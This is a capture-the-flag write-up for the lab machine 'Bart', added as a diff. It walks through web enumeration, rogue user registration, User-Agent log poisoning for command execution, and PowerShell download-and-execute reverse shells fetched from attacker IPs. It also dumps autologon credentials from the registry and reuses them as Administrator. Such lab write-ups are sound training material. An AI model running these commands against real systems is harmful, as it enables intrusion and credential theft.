@@ -1,0 +1,132 @@
+HTB-Bart-Writeup
+
+IP : 10.10.10.81
+
+Nmap
+----
+- nmap scan shows only one port open
+	- 80 running Microsoft IIS
+
+Enumeration
+-----------
+- visiting port 80 redirects to forum.bart.htb and fails to resolve 
+- we can add forum.bart.htb to our /etc/hosts file
+- loading it again gives us a webpage for Business And Revolution Technology
+- on first look through the site we get a bunch of possible usernames
+- on the bottom it says powered by wordpress 
+- we can check the source for more leads 
+- interestingly the page source does not show the usual wordpress pages like wp-admin, wp-login etc 
+- we can deduce that this is a static install of wordpress 
+- we do have some usernames in the page source 
+	- Samantha Brown
+	- Daniel Simmons
+	- Robert Hilton
+	- Harvey Potter
+	- Daniella Lamborghini   
+
+- directory brute force forum.bart.htb and got nothing 
+- some kind of filter is in place hence gobuster proves to be npt much of use to us in this case
+- we can try wfuzz 
+
+	wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ
+
+- we got a few results 
+	- monitor
+	- forum
+
+- the /monitor path gives us a login page for server monitor 
+- tried some common credentials but didnt work
+- we try the forgot password option and found that we can enumerate for usernames 
+- we tried with the usernames we got before and got a hit fot harvey
+- we can try to login with harvey giessing the password to be his last name
+
+	creds : harvey : potter
+
+- we got in
+- we now have access to internal chat
+- clicking on the internal chat box we get more details
+- from that we get a new path http://internal-01.bart.htb
+- visiting http://internal-01.bart.htb redirects to http://internal-01.bart.htb/simple_chat/login_form.php
+- directory brute forcing this doesnt give us anything interesting
+- googling around to find more information on simple chat server we found a github with the source code
+
+	  https://github.com/magkopian/php-ajax-simple-chat
+
+- inspecting the code we found that the version used by the box removed register_form.php page and the link to it from login_form.php
+- still the register_form.php posts to register.php
+- we can use curl command to register a new user
+
+	curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=lord&passwd=password"
+
+	creds : lord : password
+
+- on logging in with the credentials we created we can view the chat room
+- nothing of interest to us in there 
+- checking the source we found some additional code when compared with the code from github
+- these codes are mostly connected with the log button on the top right of the page 
+
+Shell as iusr
+-------------
+- each time someone visits log.php it records the time, username and the useragent string
+- lets see if we can exploit this in some ways 
+- we can intercept the request to logs and send that to repeater 
+- poison the user-agent to request for a php parameter and change the ename to log.php (check notion)
+- on sending this over we see the result in the response
+- now we can add the lordcmd paramater to the GET request to try to execute commands
+
+	GET /log/log.php?filename=log.php&username=harvey&lordcmd=whoami
+
+- on sending this request we get the output of the command in the response as harvey
+- now we can try to get a shell out of this 
+- copy the nashang Invoke-PowerShellTcp.ps1 over to the current working directory and make appropriate changes and host it with a python server
+- start a netcat listener
+
+	nc -nlvp 9001
+
+- we can try to download and execute the reverse shell
+
+	GET /log/log.php?filename=log.php&username=harvey&lordcmd=powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.15.54:1234/rev.ps1')
+
+- send the request and we will get a shell as nt authority\iusr
+
+Priv-esc
+--------
+- enumerating with standard windows privesc checks we found default credentials stored in the registry for autologon
+- we are not able to query it from our shell
+- to get this to work we can upload a nc64.exe and get a 64 bit shell then we will be able to dumb credentials from the registry
+
+	reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+
+- there are two ways which we can use this credentials to get access to administrator owned files
+	- run as
+	- net use 
+
+run as
+------
+- we can use the password to create a credential object that can be passed to Invoke-Command
+- start a netcat listener 
+
+	nc -lnvp 5555
+
+- setup another nishang Invoke-PowerShellTcp.ps1 reverse shell as shell.ps1 with port 5555
+
+	PS C:\inetpub\wwwroot\internal-01\log> $username = "BART\Administrator"
+	PS C:\inetpub\wwwroot\internal-01\log> $password = "3130438f31186fbaf962f407711faddb"
+	PS C:\inetpub\wwwroot\internal-01\log> $secstr = New-Object -TypeName System.Security.SecureString
+	PS C:\inetpub\wwwroot\internal-01\log> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+	PS C:\inetpub\wwwroot\internal-01\log> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+	PS C:\inetpub\wwwroot\internal-01\log> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost
+
+- we got a shell as bart\administrator
+- grab the flags
+
+net use
+-------
+- we can use the password to get access to the filesystem
+
+	net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
+	x:
+	cd users\administrator\desktop
+
+- grab the flags 
+	
